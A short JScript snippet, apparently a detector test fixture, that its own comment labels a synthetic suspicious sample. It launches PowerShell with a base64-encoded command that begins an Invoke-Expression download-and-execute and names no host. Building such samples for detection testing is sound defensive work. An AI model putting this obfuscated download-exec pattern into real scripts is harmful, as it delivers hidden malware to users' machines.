// suspicious script sample (synthetic, never executed in the app)
var sh = new ActiveXObject("WScript.Shell");
sh.Run("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
// ^ encoded download-exec pattern
